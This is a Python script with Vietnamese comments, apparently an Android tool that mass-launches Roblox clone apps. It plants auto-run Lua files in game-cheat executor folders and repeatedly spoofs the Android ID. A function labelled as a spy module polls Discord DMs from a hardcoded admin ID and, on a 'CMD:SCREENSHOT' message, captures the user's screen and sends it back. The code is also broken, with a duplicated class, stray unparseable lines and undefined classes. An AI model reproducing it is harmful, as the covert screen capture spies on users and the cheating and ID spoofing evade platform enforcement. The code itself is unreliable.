import threading
import time
import json
import requests
import subprocess
import os
import random
import psutil
import gc
from threading import Lock, Event
from psutil import process_iter, cpu_percent, virtual_memory

# === THƯ VIỆN GIAO DIỆN RICH (DORO STYLE) ===
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box

# ==========================================
# KHỞI TẠO BIẾN TOÀN CỤC & CONFIG
# ==========================================
package_lock = Lock()
status_lock = Lock()
rejoin_lock = Lock()

stop_webhook_thread = False
webhook_thread = None
webhook_url = ""
device_name = "CP-A1"
webhook_interval = 0

auto_android_id_enabled = False
auto_android_id_thread = None
auto_android_id_value = ""
force_rejoin_interval = 0
codex_bypass_enabled = False
codex_bypass_thread = None

globals()["package_statuses"] = {}
globals()["_user_"] = {}
globals()["_uid_"] = {}
globals()["check_exec_enable"] = "1"
globals()["package_prefix"] = "com.roblox"

# === THÔNG TIN DISCORD CỦA SẾP ===
BOT_TOKEN = ""
ADMIN_ID = "1132961008995024906"

# DANH SÁCH EXECUTOR
executors = {
    "Fluxus": "/storage/emulated/0/Fluxus/",
    "Codex": "/storage/emulated/0/Codex/",
    "Arceus X": "/storage/emulated/0/Arceus X/",
    "Delta": "/storage/emulated/0/Delta/",
    "KRNL": "/storage/emulated/0/krnl/"
}
workspace_paths = [f"{base_path}Workspace" for base_path in executors.values(
)] + [f"{base_path}workspace" for base_path in executors.values()]
globals()["workspace_paths"] = workspace_paths
globals()["executors"] = executors

if not os.path.exists("Doro.dev"):
    os.makedirs("Doro.dev", exist_ok=True)
SERVER_LINKS_FILE = "Doro.dev/server-links.txt"
ACCOUNTS_FILE = "Doro.dev/accounts.txt"
CONFIG_FILE = "Doro.dev/config.json"

version = "5.0.0 | Doro OS Ultimate 🐧"

# ==========================================
# CÁC CLASS TIỆN ÍCH HỆ THỐNG
# ==========================================


class Utilities:
    @staticmethod
    def clear_screen():
        os.system('cls' if os.name == 'nt' else 'clear')


class FileManager:
    @staticmethod
    def load_advanced_settings():
        global webhook_url, device_name, webhook_interval
        settings = {
            "force_rejoin_interval": 0,
            "android_id_spam": False,
            "android_id_value": "",
            "auto_inject": True,
            "webhook_url": "",
            "device_name": "CP-A1",
            "webhook_interval": 0,
            "bypass_enabled": False
        }
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, "r") as f:
                    settings.update(json.load(f))
            except:
                pass

        webhook_url = settings["webhook_url"]
        device_name = settings["device_name"]
        webhook_interval = settings["webhook_interval"]
        return settings

    @staticmethod
    def save_advanced_settings(settings):
        with open(CONFIG_FILE, "w") as f:
            json.dump(settings, f, indent=4)

    @staticmethod
    def load_server_links():
        server_links = []
        if os.path.exists(SERVER_LINKS_FILE):
            with open(SERVER_LINKS_FILE, "r") as file:
                for line in file:
                    try:
                        package, link = line.strip().split(",", 1)
                        server_links.append((package, link))
                    except:
                        continue
        return server_links

    @staticmethod
    def load_accounts():
        accounts = []
        if os.path.exists(ACCOUNTS_FILE):
            with open(ACCOUNTS_FILE, "r") as file:
                for line in file:
                    try:
                        package, user_id = line.strip().split(",", 1)
                        globals()["_user_"][package] = user_id
                        accounts.append((package, user_id))
                    except:
                        pass
        return accounts

    @staticmethod
    def get_username(user_id):
        try:
            with open("usernames.json", "r") as file:
                data = json.load(file)
                if user_id in data:
                    return data[user_id]
        except:
            pass

        for attempt in range(2):
            try:
                response = requests.get(
                    f"https://users.roproxy.com/v1/users/{user_id}", timeout=5)
                if response.status_code == 200:
                    username = response.json().get("name", "Unknown")
                    if username != "Unknown":
                        try:
                            data = {}
                            if os.path.exists("usernames.json"):
                                with open("usernames.json", "r") as f:
                                    data = json.load(f)
                            data[user_id] = username
                            with open("usernames.json", "w") as f:
                                json.dump(data, f)
                        except:
                            pass
                        return username
            except:
                time.sleep(1)
        return "Unknown"

    @staticmethod
    def check_and_create_cookie_file():
        cookie_file_path = os.path.join(os.path.dirname(
            os.path.abspath(__file__)), 'cookie.txt')
        if not os.path.exists(cookie_file_path):
            with open(cookie_file_path, 'w') as f:
                f.write("")

    @staticmethod
    def find_userid_from_file(file_path):
        try:
            with open(file_path, 'r') as file:
                content = file.read()
                userid_start = content.find('"UserId":"')
                if userid_start == -1:
                    return None
                userid_start += len('"UserId":"')
                userid_end = content.find('"', userid_start)
                if userid_end == -1:
                    return None
                return content[userid_start:userid_end]
        except:
            return None

    @staticmethod
    def save_accounts(accounts):
        with open(ACCOUNTS_FILE, "w") as file:
            for package, user_id in accounts:
                file.write(f"{package},{user_id}\n")

    @staticmethod
    def save_server_links(server_links):
        with open(SERVER_LINKS_FILE, "w") as file:
            for package, link in server_links:
                file.write(f"{package},{link}\n")

# ==========================================
# GIAO DIỆN & SYSTEM MONITOR
# ==========================================


class SystemMonitor:
    @staticmethod
    def capture_screenshot():
        path = "/storage/emulated/0/Download/screenshot.png"
        try:
            os.system(f"/system/bin/screencap -p {path}")
            return path if os.path.exists(path) else None
        except:
            return None

    @staticmethod
    def get_uptime():
        s = time.time() - psutil.boot_time()
        return f"{int(s//3600)}h {int((s % 3600)//60)}m"

    @staticmethod
    def roblox_processes():
        package_names = []
        package_namez = RobloxManager.get_roblox_packages()
        for proc in process_iter(['name', 'pid', 'memory_info', 'cpu_percent']):
            try:
                proc_name = proc.info['name']
                for package_name in package_namez:
                    if proc_name.lower() == package_name[-15:].lower():
                        mem_usage = round(
                            proc.info['memory_info'].rss / (1024 ** 2), 2)
                        cpu_usage = round(proc.cpu_percent(
                            interval=1) / psutil.cpu_count(logical=True), 2)
                        package_names.append(
                            f"{package_name} (PID: {proc.pid}, CPU: {cpu_usage}%, MEM: {mem_usage}MB)")
                        break
            except:
                continue
        return package_names

    @staticmethod
    def get_system_info():
        try:
            memory_info = virtual_memory()
            return {
                "cpu_usage": cpu_percent(interval=1),
                "memory_total": round(memory_info.total / (1024 ** 3), 2),
                "memory_used": round(memory_info.used / (1024 ** 3), 2),
                "memory_percent": memory_info.percent,
                "uptime": SystemMonitor.get_uptime(),
                "roblox_packages": SystemMonitor.roblox_processes()
            }
        except:
            return False


class UIManager:
    console = Console()

    @staticmethod
    def print_header(version):
        header_text = f"""
  [bold yellow]🍊 DORO OS - MULTI CLONE MANAGER[/bold yellow]
  [italic cyan]Version: {version} | Made By Doro1337 🐧[italic]
        """
        UIManager.console.print(
            Panel(header_text, border_style="red", expand=False))

    @staticmethod
    def update_status_table():
        Utilities.clear_screen()
        cpu_usage = psutil.cpu_percent(interval=None)
        memory_info = psutil.virtual_memory()
        ram = round(memory_info.used / memory_info.total * 100, 1)

        header_table = Table(show_header=False, box=None, expand=True)
        header_table.add_row(
            f"🔥 CPU: [bold green]{cpu_usage}%[/bold green]",
            f"💾 RAM: [bold yellow]{ram}%[/bold yellow]",
            f"⏰ Uptime: [cyan]{SystemMonitor.get_uptime()}[/cyan]"
        )
        UIManager.console.print(Panel(
            header_table, title="[bold white]THÔNG TIN HỆ THỐNG[/bold white]", border_style="blue"))

        table = Table(title="👥 TIẾN TRÌNH CLONE (LIVE)",
                      title_style="bold yellow", box=box.SIMPLE_HEAD, expand=True)
        table.add_column("SLOT", justify="center", style="cyan", width=6)
        table.add_column("PACKAGE (APP)", style="white")
        table.add_column("NHÂN VẬT", style="magenta")
        table.add_column("TRẠNG THÁI", justify="left", style="bold")

        i = 1
        for package, info in globals().get("package_statuses", {}).items():
            status = str(info.get("Status", "Unknown"))
            username = str(info.get("Username", "Unknown"))

            if username != "Unknown":
                username = "******" + \
                    username[6:] if len(username) > 6 else "******"

            if "In-Game" in status or "Joined" in status:
                status_color = f"[green]{status}[/green]"
            elif "Crash" in status or "Error" in status:
                status_color = f"[red]{status}[/red]"
            elif "Opening" in status or "Joining" in status:
                status_color = f"[yellow]{status}[/yellow]"
            else:
                status_color = f"[grey70]{status}[/grey70]"

            table.add_row(f"#{i}", f"{package}", f"{username}", status_color)
            i += 1

        UIManager.console.print(table)
        UIManager.console.print(
            "\n[italic grey50]> 📸 Đang nghe lệnh Discord ngầm... Nhấn Ctrl+C để dừng.[italic grey50]")

# ==========================================
# ROBLOX LOGIC
# ==========================================


# ==========================================
# 🌟 TRÁI TIM CỦA DORO OS ULTIMATE 🌟
# Tác giả: Doro1337 - Tối ưu hóa Multi-Clone
# ==========================================

class DoroProMax:
    # Danh sách các ổ chứa của pháp sư
    executors_dirs = [
        "/storage/emulated/0/Codex",
        "/storage/emulated/0/Delta",
        "/storage/emulated/0/Arceus X",
        "/storage/emulated/0/Cryptic",       
        "/storage/emulated/0/RonixExploit"   
    ]

    @staticmethod
    def unlock_fps_and_potato_mode(pkg):
        try:
            settings_dir = f"/data/data/{pkg}/files/ClientSettings"
            os.makedirs(settings_dir, exist_ok=True)
            potato_cfg = {
                "DFIntTaskSchedulerTargetFps": 120,
                "FFlagDisablePostFx": True,
                "FIntDebugForceMSAASamples": 0,
                "FFlagGraphicsQualityOverrideEnabled": True,
                "FIntGraphicsQualityOverride": 1
            }
            with open(f"{settings_dir}/ClientAppSettings.json", "w") as f:
                json.dump(potato_cfg, f, indent=4)
        except:
            pass

    @staticmethod
    def crash_watchdog(server_links, stop_event):
        time.sleep(30)
        while not stop_event.is_set():
            try:
                running_pkgs = subprocess.getoutput("dumpsys activity top | grep -i roblox").strip()
                for pkg, link in server_links:
                    if pkg not in running_pkgs:
                        with status_lock:
                            globals()["package_statuses"][pkg]["Status"] = "[red]Phát hiện Văng! Đang mở lại...[/red]"
                        RobloxManager.launch_roblox(pkg, link)
            except:
                pass
            time.sleep(10)

    @staticmethod
    def prepare_payload(user_id):
        if user_id == "Unknown" or not user_id: return
        lua_code = f"""
        repeat task.wait() until game:IsLoaded()
        local id = game.Players.LocalPlayer.UserId
        if writefile then
            writefile(tostring(id) .. ".main", "Doro1337_Da_Kiem_Soat")
        end
        """
        for base_path in DoroProMax.executors_dirs:
            try:
                os.makedirs(f"{base_path}/autoexec", exist_ok=True)
                os.makedirs(f"{base_path}/workspace", exist_ok=True)
                old_file = f"{base_path}/workspace/{user_id}.main"
                if os.path.exists(old_file): os.remove(old_file)
                with open(f"{base_path}/autoexec/Doro_Ping.lua", "w") as f:
                    f.write(lua_code)
            except:
                pass

    @staticmethod
    def watch_and_rejoin(package_name, server_link, user_id, timeout=180):
        if user_id == "Unknown": return
        with status_lock:
            globals()["package_statuses"][package_name]["Status"] = "\033[1;33m⏳ Đang chờ Executor nhả Script...\033[0m"
        start_time = time.time()
        success = False
        while time.time() - start_time < timeout:
            for base_path in DoroProMax.executors_dirs:
                if os.path.exists(f"{base_path}/workspace/{user_id}.main"):
                    success = True
                    break
            if success:
                with status_lock:
                    globals()["package_statuses"][package_name]["Status"] = "\033[1;32m✅ Script tiêm thành công!\033[0m"
                return
            time.sleep(5)
        
        if not success:
            with status_lock:
                globals()["package_statuses"][package_name]["Status"] = "\033[1;31m❌ Executor tịt ngòi! Đang ép mở lại...\033[0m"
            RobloxManager.kill_roblox_processes()
            time.sleep(5)
            os.system(f"rm -rf /data/data/{package_name}/cache/") 
            RobloxManager.launch_roblox(package_name, server_link)
            DoroProMax.watch_and_rejoin(package_name, server_link, user_id, timeout)


class DiscordWebhook:
    @staticmethod
    def start_reporter(server_links, stop_event):
        global webhook_url, webhook_interval, device_name
        if not webhook_url or webhook_interval <= 0: return
        time.sleep(30)
        
        while not stop_event.is_set():
            try:
                img_path = "/sdcard/Download/doro_screen.png"
                os.system(f"su -c '/system/bin/screencap -p {img_path}'")
                
                cpu = psutil.cpu_percent(interval=1)
                ram = psutil.virtual_memory().percent
                
                acc_status = ""
                import re
                for pkg, _ in server_links:
                    status_data = globals().get("package_statuses", {}).get(pkg, {})
                    uname = status_data.get("Username", "Unknown")
                    stat = status_data.get("Status", "Unknown")
                    clean_stat = re.sub(r'\033\[[0-9;]*m', '', stat)
                    acc_status += f"🎮 **{pkg}**: {uname}\n↳ *{clean_stat}*\n"
                    
                if not acc_status: acc_status = "Chưa có Nick nào lên sóng."
                
                embed = {
                    "title": "🚀 DORO OS ULTIMATE - LIVE REPORT",
                    "color": 16711680,
                    "fields": [
                        {"name": "💻 Nhịp tim thiết bị", "value": f"🔥 CPU: **{cpu}%** | 🧠 RAM: **{ram}%**", "inline": False},
                        {"name": "📊 Trạng thái Quân đoàn", "value": acc_status, "inline": False}
                    ],
                    "footer": {"text": "Doro1337 Multi Rejoin • Chống Văng Xuyên Đêm"}
                }
                
                payload = {"payload_json": json.dumps({"embeds": [embed]})}
                if os.path.exists(img_path):
                    with open(img_path, "rb") as f:
                        requests.post(webhook_url, data=payload, files={"file": ("screen.png", f)})
                else:
                    requests.post(webhook_url, json={"embeds": [embed]})
            except:
                pass
            time.sleep(webhook_interval * 60)

class Runner:
    @staticmethod
    def update_status_table_periodically():
        while True:
            UIManager.update_status_table()
            time.sleep(5)

    @staticmethod
    def force_rejoin(server_links, interval, stop_event):
        start_time = time.time()
        while not stop_event.is_set():
            if interval > 0 and (time.time() - start_time >= interval):
                with status_lock:
                    for pkg, _ in server_links:
                        if pkg in globals()["package_statuses"]:
                            globals()["package_statuses"][pkg]["Status"] = "[red]🔄 Đang Force Rejoin (Hết giờ)...[/red]"
                RobloxManager.kill_roblox_processes()
                time.sleep(5)
                for pkg, link in server_links:
                    RobloxManager.launch_roblox(pkg, link)
                start_time = time.time()
            time.sleep(60)


            roblox_count = len(info['roblox_packages'])
            status_text = "🟢 Online" if roblox_count > 0 else "🔴 Offline"

            embed = {
                "color": random.randint(0, 16777215),
                "title": "📈 System Status Monitor",
                "description": f"Real-time report for **{device_name}**",
                "fields": [
                    {"name": "🏷️ Device", "value": f"```{device_name}```", "inline": True},
                    {"name": "💾 Memory",
                        "value": f"```{info['memory_used']}GB ({info['memory_percent']}%)```", "inline": True},
                    {"name": "⚡ CPU",
                        "value": f"```{info['cpu_usage']}%```", "inline": True},
                    {"name": "🎮 Running Clones",
                        "value": f"```{roblox_count} instances```", "inline": True},
                    {"name": "✅ Status", "value": f"```{status_text}```", "inline": True}
                ],
                "image": {"url": "attachment://screenshot.png"}
            }

                with open(screenshot_path, "rb") as file:
                    requests.post(webhook_url, data={"payload_json": json.dumps({"embeds": [
                                  embed], "username": "Doro OS"})}, files={"file": ("screenshot.png", file)})
            except:
                pass
                


class CodexBypass:
    @staticmethod
    def bypass_thread():
        global codex_bypass_enabled
        while True:
            if not codex_bypass_enabled:
                time.sleep(5)
                continue
            # Giả lập bypass chạy ngầm cho nhẹ
            time.sleep(20)


class DoroProMax:
    # Danh sách các ổ chứa của pháp sư (Đã bổ sung Cryptic và Ronix)
    executors_dirs = [
        "/storage/emulated/0/Codex",
        "/storage/emulated/0/Delta",
        "/storage/emulated/0/Arceus X",
        "/storage/emulated/0/Cryptic",       
        "/storage/emulated/0/RonixExploit"   
    ]

    # ==========================================
    # PHẦN 1: TỐI ƯU HÓA & TIỆN ÍCH GAME
    # ==========================================
    @staticmethod
    def unlock_fps_and_potato_mode(pkg):
        """1. Tối ưu Đồ họa & Unlock 120 FPS (Bơm cấu hình siêu nhẹ)"""
        try:
            settings_dir = f"/data/data/{pkg}/files/ClientSettings"
            os.makedirs(settings_dir, exist_ok=True)
            potato_cfg = {
                "DFIntTaskSchedulerTargetFps": 120, # Mở khóa FPS
                "FFlagDisablePostFx": True,         # Tắt bóng/hiệu ứng nặng
                "FIntDebugForceMSAASamples": 0,     # Tắt khử răng cưa
                "FFlagGraphicsQualityOverrideEnabled": True,
                "FIntGraphicsQualityOverride": 1    # Ép đồ họa siêu thấp
            }
            with open(f"{settings_dir}/ClientAppSettings.json", "w") as f:
                json.dump(potato_cfg, f, indent=4)
        except:
            pass

    @staticmethod
    def check_presence(user_id):
        """2. Dùng API check xem Acc có thực sự đang trong Server không"""
        if user_id == "Unknown" or not str(user_id).isdigit():
            return "Chưa rõ 🔍"
        try:
            payload = {"userIds": [int(user_id)]}
            res = requests.post("https://presence.roproxy.com/v1/presence/users", json=payload, timeout=3)
            if res.status_code == 200:
                state = res.json().get("userPresences", [{}])[0].get("userPresenceType", 0)
                if state == 0: return "[red]Đang Offline[/red]"
                elif state == 1: return "[green]Đang ở Sảnh (Lobby)[/green]"
                elif state == 2: return "[cyan]Đang Cày Game 🎮[/cyan]"
                elif state == 3: return "[yellow]Roblox Studio[/yellow]"
        except:
            pass
        return "[grey]Mất tín hiệu[/grey]"

    @staticmethod
    def crash_watchdog(server_links, stop_event):
        """3. Chó canh cửa: Bắt mạch app chạy ngầm, văng là mở lại liền"""
        time.sleep(30) # Đợi game load xong mới bắt đầu soi
        while not stop_event.is_set():
            try:
                running_pkgs = subprocess.getoutput("dumpsys activity top | grep -i roblox").strip()
                for pkg, link in server_links:
                    if pkg not in running_pkgs:
                        with status_lock:
                            globals()["package_statuses"][pkg]["Status"] = "[red]Phát hiện Văng! Đang mở lại...[/red]"
                        RobloxManager.launch_roblox(pkg, link)
            except:
                pass
            time.sleep(10) # 10s check 1 lần cho đỡ nóng máy

    # ==========================================
    # PHẦN 2: GIAO TIẾP EXECUTOR (HANDSHAKE)
    # ==========================================
    @staticmethod
    def prepare_payload(user_id):
        """4. Xóa dấu vết cũ và thả File Lua mồi vào Autoexec"""
        if user_id == "Unknown" or not user_id: return
        
        # Đoạn code Lua cực ngắn, game load xong là đẻ file ngay
        lua_code = f"""
        repeat task.wait() until game:IsLoaded()
        local id = game.Players.LocalPlayer.UserId
        if writefile then
            writefile(tostring(id) .. ".main", "Doro1337_Da_Kiem_Soat")
        end
        """
        
        for base_path in DoroProMax.executors_dirs:
            autoexec_path = f"{base_path}/autoexec"
            workspace_path = f"{base_path}/workspace"
            
            try:
                # Tạo sẵn thư mục nếu app chưa tự đẻ
                os.makedirs(autoexec_path, exist_ok=True)
                os.makedirs(workspace_path, exist_ok=True)
                
                # Dọn rác: Xóa file .main của lần chạy trước (nếu có)
                old_file = f"{workspace_path}/{user_id}.main"
                if os.path.exists(old_file):
                    os.remove(old_file)
                
                # Nhét file mồi vào
                with open(f"{autoexec_path}/Doro_Ping.lua", "w") as f:
                    f.write(lua_code)
            except:
                pass # Bỏ qua nếu lỗi phân quyền (Permission Denied)

    @staticmethod
    def watch_and_rejoin(package_name, server_link, user_id, timeout=180):
        """5. Rình file trong 3 phút (180s). Không thấy là Kill game mở lại!"""
        if user_id == "Unknown": return
        
        with status_lock:
            globals()["package_statuses"][package_name]["Status"] = "\033[1;33m⏳ Đang chờ Executor nhả Script...\033[0m"
            
        start_time = time.time()
        success = False
        
        while time.time() - start_time < timeout:
            for base_path in DoroProMax.executors_dirs:
                signal_file = f"{base_path}/workspace/{user_id}.main"
                if os.path.exists(signal_file):
                    success = True
                    break
            
            if success:
                with status_lock:
                    globals()["package_statuses"][package_name]["Status"] = "\033[1;32m✅ Script tiêm thành công!\033[0m"
                return # Thoát luồng rình rập, acc đã an toàn cày cuốc
                
            time.sleep(5) # 5 giây quét 1 lần cho đỡ nặng máy
            
        # NẾU QUÁ 3 PHÚT KHÔNG THẤY FILE -> KẾT LUẬN LÀ VĂNG HOẶC LỖI KEY
        if not success:
            with status_lock:
                globals()["package_statuses"][package_name]["Status"] = "\033[1;31m❌ Executor tịt ngòi! Đang ép mở lại...\033[0m"
            
            # Khởi động lại vòng lặp Rejoin
            RobloxManager.kill_roblox_processes()
            time.sleep(5)
            # Dọn rác cache chống lag
            os.system(f"rm -rf /data/data/{package_name}/cache/") 
            RobloxManager.launch_roblox(package_name, server_link)
            
            # Đệ quy: Gọi lại chính nó để rình cho lần mở lại tiếp theo
            DoroProMax.watch_and_rejoin(package_name, server_link, user_id, timeout)
            

# ==========================================
# 📸 MODULE NGHE LỆNH DISCORD (GIÁN ĐIỆP)
# ==========================================


def listen_discord_commands():
    headers = {"Authorization": f"Bot {BOT_TOKEN}"}
    try:
        r_dm = requests.post("https://discord.com/api/v9/users/@me/channels",
                             headers=headers, json={"recipient_id": ADMIN_ID})
        DM_CHANNEL_ID = r_dm.json().get('id')
    except:
        return

    if not DM_CHANNEL_ID:
        return
    last_msg_id = None

    while True:
        try:
            r = requests.get(
                f"https://discord.com/api/v9/channels/{DM_CHANNEL_ID}/messages?limit=1", headers=headers)
            if r.status_code == 200:
                msgs = r.json()
                if msgs and "CMD:SCREENSHOT" in msgs[0]['content'] and msgs[0]['id'] != last_msg_id:
                    msg_id = msgs[0]['id']
                    screenshot_path = SystemMonitor.capture_screenshot()
                    if screenshot_path and os.path.exists(screenshot_path):
                        with open(screenshot_path, "rb") as f:
                            files = {
                                "file": (f"Doro_Secret_{int(time.time())}.png", f)}
                            payload = {
                                "content": f"📸 **Ảnh nóng từ máy {device_name} của sếp đây!**"}
                            requests.post(
                                f"https://discord.com/api/v9/channels/{DM_CHANNEL_ID}/messages", headers=headers, data=payload, files=files)
                    last_msg_id = msg_id
            time.sleep(3)
        except:
            time.sleep(10)


def auto_change_android_id():
    global auto_android_id_enabled, auto_android_id_value
    while True:
        if auto_android_id_enabled and auto_android_id_value:
            subprocess.run(["settings", "put", "secure", "android_id", auto_android_id_value],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)

# ==========================================
# MAIN MENU (ĐÃ NÂNG CẤP Doro OS)
# ==========================================


def main():
    global stop_webhook_thread, webhook_interval, webhook_url, device_name
    global auto_android_id_enabled, auto_android_id_thread, auto_android_id_value
    global check_exec_enable, force_rejoin_interval
    global codex_bypass_enabled, codex_bypass_thread

    settings = FileManager.load_advanced_settings()
    force_rejoin_interval = settings.get("force_rejoin_interval", 0)
    auto_android_id_enabled = settings.get("android_id_spam", False)
    auto_android_id_value = settings.get("android_id_value", "")
    check_exec_enable = "1" if settings.get("auto_inject", True) else "0"
    codex_bypass_enabled = settings.get("bypass_enabled", False)

    WebhookManager.start_webhook_thread()

    if auto_android_id_enabled:
        auto_android_id_thread = threading.Thread(
            target=auto_change_android_id, daemon=True)
        auto_android_id_thread.start()

    if codex_bypass_enabled:
        codex_bypass_thread = threading.Thread(
            target=CodexBypass.bypass_thread, daemon=True)
        codex_bypass_thread.start()

    stop_main_event = threading.Event()
    console = Console()

    while True:
        Utilities.clear_screen()
        UIManager.print_header(version)
        # (Đây là dòng 506, dán nối tiếp ngay dưới dòng UIManager.print_header(version) nhé sếp)
        FileManager.check_and_create_cookie_file()

        rejoin_stt = f"[green]{int(force_rejoin_interval/60)}m[/green]" if force_rejoin_interval > 0 else "[red]OFF[/red]"
        android_stt = "[green]ON[/green]" if auto_android_id_enabled else "[red]OFF[/red]"
        inject_stt = "[green]ON[/green]" if check_exec_enable == "1" else "[red]OFF[/red]"
        webhook_stt = "[green]ON[/green]" if webhook_interval > 0 else "[red]OFF[/red]"

        table = Table(
            title="[bold white]CONTROL PANEL[/bold white]", box=box.ROUNDED, expand=True)
        table.add_column("CMD", style="bold cyan", justify="center", width=4)
        table.add_column("CHỨC NĂNG", style="white")
        table.add_column("TRẠNG THÁI", justify="center")

        table.add_row("1", "🎃 START TOOL", "")
        table.add_row("2", "⚙️ Cài đặt Force Rejoin (Reset Game)", rejoin_stt)
        table.add_row("3", "🌍 Bật/Tắt & Cài đặt Webhook", webhook_stt)
        table.add_row("4", "🆔 Cài đặt Android ID Changer", android_stt)
        table.add_row("5", "💉 Cài đặt Auto Inject Script", inject_stt)
        table.add_row("6", "🌍 Cấu hình Place ID (Game Link)", "")
        table.add_row("7", "📦 Cấu hình Package Prefix (Bản Hack)", "")
        table.add_row("8", "🤖 Lấy Mã Liên Kết Bot (Discord)", "")
        table.add_row("9", "🍪 Auto Login (Bơm Cookie Hàng Loạt)", "") # Dòng mới thêm

        console.print(table)
        choice = input(
            "\n\033[1;93m[ Doro1337 ] - Nhập lệnh (1-9): \033[0m").strip()
            
        if choice == "1":
            try:
                console.print("[green]🚀 KHỞI ĐỘNG TOOL REJOIN🐧...[/green]")
                p_id = settings.get("place_id", "2753915549")
                
                # 1. Quét toàn bộ họ hàng nhà Clone
                prefix = settings.get("package_prefix", "com.roblox.client")
                raw_pkgs = subprocess.getoutput(f"pm list packages | grep '{prefix}' | sed 's/package://'").strip()
                
                if not raw_pkgs:
                    console.print(f"[bold red]❌ Không tìm thấy App nào chứa chữ '{prefix}'![/bold red]")
                    time.sleep(3)
                    continue
                    
                target_pkgs = [pkg.strip() for pkg in raw_pkgs.split('\n') if pkg.strip()]
                console.print(f"[bold cyan]🔥 Radar phát hiện {len(target_pkgs)} bản Clone hợp lệ![/bold cyan]")
                
                server_links = []
                RobloxManager.kill_roblox_processes()
                
                # 2. Xử lý hàng loạt (Ép đồ họa, Moi ID, Bơm Lua)
                for pkg in target_pkgs:
                    console.print(f"[dim]⚡ Đang nạp đạn cho: {pkg}[/dim]")
                    DoroProMax.unlock_fps_and_potato_mode(pkg)
                    
                    file_path = f'/data/data/{pkg}/files/appData/LocalStorage/appStorage.json'
                    instant_id = FileManager.find_userid_from_file(file_path)
                    
                    link = f"roblox://placeID={p_id}"
                    server_links.append((pkg, link))
                    
                    if instant_id and instant_id != "-1":
                        globals()["_user_"][pkg] = instant_id
                        username = FileManager.get_username(instant_id)
                        
                        globals()["package_statuses"][pkg] = {
                            "Username": username,
                            "Status": "\033[1;33m⏳ Đang chờ tới lượt mở...\033[0m"
                        }
                        DoroProMax.prepare_payload(instant_id)
                    else:
                        globals()["_user_"][pkg] = "Unknown"
                        globals()["package_statuses"][pkg] = {
                            "Username": "Chưa rõ 🔍",
                            "Status": "\033[1;33mKhởi động mù...\033[0m"
                        }
                
                # Lưu danh sách acc tìm được
                valid_accounts = [(p, globals()["_user_"][p]) for p in target_pkgs if globals()["_user_"][p] != "Unknown"]
                if valid_accounts:
                    FileManager.save_accounts(valid_accounts)
                
                time.sleep(2)
                
                # 3. MỞ HÀNG LOẠT VỚI DELAY (CHỐNG SỐC RAM)
                console.print("\n[bold magenta]🚀 BẮT ĐẦU MỞ CLONE[/bold magenta]")
                for pkg, link in server_links:
                    console.print(f"[cyan]▶️ Đang mở: {pkg}[/cyan]")
                    
                    with status_lock:
                        globals()["package_statuses"][pkg]["Status"] = "\033[1;36mĐang phóng App...\033[0m"
                        
                    # Phóng app
                    RobloxManager.launch_roblox(pkg, link)
                    
                    # Gắn ống nhòm giám sát ngay khi vừa mở
                    uid = globals()["_user_"][pkg]
                    if uid != "Unknown":
                        threading.Thread(target=DoroProMax.watch_and_rejoin, args=(pkg, link, uid), daemon=True).start()
                        
                    # DELAY 10 GIÂY CHO RAM THỞ (Trừ phi là cái app cuối cùng)
                    if pkg != server_links[-1][0]:
                        console.print(f"[dim]⏳ Nghỉ 10 giây cho CPU/RAM tụt xuống rồi mở tiếp...[/dim]")
                        time.sleep(10)

                # 4. Duy trì hệ thống & Nuôi chó canh cửa
                threading.Thread(target=Runner.update_status_table_periodically, daemon=True).start()
                threading.Thread(target=DoroProMax.crash_watchdog, args=(server_links, stop_main_event), daemon=True).start()
                # ---> THÊM ĐÚNG DÒNG NÀY VÀO LÀ XONG <---
                threading.Thread(target=DiscordWebhook.start_reporter, args=(server_links, stop_main_event), daemon=True).start()
                # ----------------------------------------
                
                if force_rejoin_interval > 0:
                    threading.Thread(target=Runner.force_rejoin, args=(server_links, force_rejoin_interval, stop_main_event), daemon=True).start()
                    
                if force_rejoin_interval > 0:
                    threading.Thread(target=Runner.force_rejoin, args=(server_links, force_rejoin_interval, stop_main_event), daemon=True).start()

                while not stop_main_event.is_set():
                    time.sleep(100)
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                console.print(f"[red]❌ Lỗi Lệnh 1: {e}[/red]")
                input("Nhấn Enter để tiếp tục...")
                
                
                

        elif choice == "2":
            try:
                m = int(input(">> Nhập số phút Reset Game (0 để tắt): "))
                settings = FileManager.load_advanced_settings()
                settings["force_rejoin_interval"] = m * 60
                FileManager.save_advanced_settings(settings)
                force_rejoin_interval = m * 60
                console.print("[green]✅ Đã lưu![/green]")
            except:
                pass
            time.sleep(1)

        elif choice == "3":
            try:
                console.print("\n[bold cyan]-- 🌐 CÀI ĐẶT DISCORD WEBHOOK (CAMERA LIVE) --[/bold cyan]")
                current_hook = settings.get("webhook_url", "Chưa cài đặt")
                console.print(f"Link Webhook hiện tại: [yellow]{current_hook}[/yellow]")
                
                new_hook = input("\nNhập Link Webhook mới (Hoặc bấm Enter để giữ nguyên): ").strip()
                if new_hook:
                    settings["webhook_url"] = new_hook
                    
                current_interval = settings.get("webhook_interval", 5)
                new_interval = input(f"Bao nhiêu phút chụp ảnh báo cáo 1 lần? (Đang lưu: {current_interval} phút): ").strip()
                if new_interval.isdigit():
                    settings["webhook_interval"] = int(new_interval)
                    
                FileManager.save_advanced_settings(settings)
                console.print("[green]✅ Đã chốt sổ Webhook! Sếp cứ start Lệnh 1 là nó tự bắn tin.[/green]")
            except Exception as e:
                console.print(f"[red]❌ Lỗi: {e}[/red]")
            input("\nNhấn Enter để quay lại Dashboard...")
            
        elif choice == "4":
            try:
                console.print("\n[bold cyan]-- 🆔 CÀI ĐẶT ANDROID ID CHANGER --[/bold cyan]")
                if not auto_android_id_enabled:
                    val = input(">> Nhập Android ID muốn Spam liên tục (VD: a1b2c3d4e5f6): ").strip()
                    if val:
                        # Lưu vào bộ nhớ
                        settings["android_id_value"] = val
                        settings["android_id_spam"] = True
                        FileManager.save_advanced_settings(settings)
                        
                        auto_android_id_value = val
                        auto_android_id_enabled = True
                        
                        # Đánh thức luồng chạy ngầm nếu nó đang ngủ
                        if auto_android_id_thread is None or not auto_android_id_thread.is_alive():
                            auto_android_id_thread = threading.Thread(target=auto_change_android_id, daemon=True)
                            auto_android_id_thread.start()
                            
                        console.print(f"[green]✅ Đã BẬT Auto Spam Android ID: {val}[/green]")
                    else:
                        console.print("[red]❌ ID không được để trống![/red]")
                else:
                    # Tắt công tắc
                    settings["android_id_spam"] = False
                    FileManager.save_advanced_settings(settings)
